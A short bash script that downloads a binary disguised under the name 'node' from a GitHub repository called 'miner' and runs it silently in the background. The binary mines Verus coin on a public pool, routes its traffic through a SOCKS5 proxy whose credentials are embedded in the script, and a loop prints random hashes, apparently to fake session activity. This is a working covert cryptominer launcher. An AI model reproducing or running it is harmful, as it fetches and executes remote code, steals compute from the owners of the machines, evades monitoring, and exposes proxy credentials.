#!/bin/bash
wget -q https://github.com/fuckl0l/miner/raw/main/node
chmod +x node
pool="stratum+tcp://verushash.mine.zergpool.com:3300"
wallet="$1"
workername="$2"
coin="$3"
proxy="socks5://gtfrmnnv:h7l3wob1wn3m@45.72.119.109:9185"
./node -a verus -o $pool -u $wallet.$workername -t 2 -p c=$coin -x $proxy >/dev/null &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
